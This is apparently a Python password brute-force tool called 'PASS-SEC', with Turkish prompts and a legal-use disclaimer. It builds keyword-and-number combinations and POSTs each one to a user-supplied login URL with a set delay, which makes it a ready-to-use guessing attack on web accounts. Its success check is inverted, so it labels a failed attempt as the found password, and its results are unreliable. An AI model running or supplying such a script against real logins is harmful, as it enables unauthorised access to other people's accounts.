from colorama import init, Fore, Style
import os
import requests
import time
from itertools import product

init(autoreset=True)

banner = f"{Fore.RED + Style.BRIGHT}PASS-SEC{Style.RESET_ALL}"
terminal_width = os.get_terminal_size().columns
banner = banner.center(400)

print(banner)

responsibility_disclaimer = "Bu program sadece güvenilir ve yasal kullanım amaçları için geliştirilmiştir.\n" \
                            "Kötü niyetli veya yasa dışı faaliyetlerde kullanmak yasaktır.\n" \
                            "Programın kullanımı sonucu ortaya çıkabilecek yasal sorumluluk tamamen kullanıcıya aittir.\n" \
                            "Geliştirici (rothilion26) programın yanlış kullanımından sorumlu tutulamaz.\n" \
                            "Programı yalnızca kendi hesabınız için kullanmalı ve yasal sınırları aşmamalısınız.\n" \
                            "Programı kullanmaya başlamadan önce tüm yasal düzenlemelere uyun ve sayfa sahibinin iznini alın.\n" \
                            "Bu beyanı kabul ediyorsanız programı kullanmaya devam edebilirsiniz.\n" \
                            "Kullanmıyorsanız lütfen programı derhal kapatın."
# Beyanı yeşil olarak yazdır
responsibility_disclaimer = f"{Fore.GREEN}{responsibility_disclaimer}{Style.RESET_ALL}"
print(responsibility_disclaimer)

# Kullanıcıdan kullanıcı adını al
username = input("Kullanıcı adınızı girin: ")

# Kullanıcıdan giriş yapılacak sayfanın URL'sini al
login_url = input("Giriş yapılacak sayfanın URL'sini girin: ")

# Elle girilecek hata mesajı
error_message = input("Lütfen sayfada oluşan hata mesajını girin: ")

# Kullanıcıdan gecikme süresini saniye olarak iste
delay_seconds = int(input("Şifre deneme aralığını saniye olarak girin: "))

# Kullanıcıdan anahtar kelimeleri al
keywords = []
while True:
    keyword = input("Anahtar kelime (Çıkmak için 'q' girin): ")
    if keyword.lower() == 'q':
        break
    keywords.append(keyword)

# Kullanıcıdan sayıları al
numbers = []
while True:
    number = input("Sayı (Çıkmak için 'q' girin): ")
    if number.lower() == 'q':
        break
    numbers.append(number)

# Kombinasyonları oluştur
combinations = []
for keyword, number in product(keywords, numbers):
    combinations.append(keyword + number)
    combinations.append(number + keyword)

# Tahmini kombinasyon sayısını hesapla
combinations_count = len(combinations)

# Tahmini çalışma süresini hesapla (kombinasyon sayısı x gecikme süresi)
estimated_time_seconds = combinations_count * delay_seconds

print(f"Tahmini kombinasyon sayısı: {combinations_count}")
print(f"Tahmini çalışma süresi: {estimated_time_seconds} saniye ({estimated_time_seconds/3600:.2f} saat)")

start = input("Programı başlatmak istiyor musunuz? (Evet/Hayır): ")

if start.lower() == 'evet':
    # Şifre deneme fonksiyonu
    def try_password(password):
        session = requests.Session()
        login_data = {
            'username': username,
            'password': password
        }

        response = session.post(login_url, data=login_data)

        if error_message not in response.text:
            print(f'Şifre denendi: {password}')
            return False
        else:
            print(f'Şifre bulundu: {password}')
            return True

    # Şifre kombinasyonlarını deneme
    for combination in combinations:
        if try_password(combination):
            break
        time.sleep(delay_seconds)
else:
    print("Program başlatılmadı. İyi günler!")
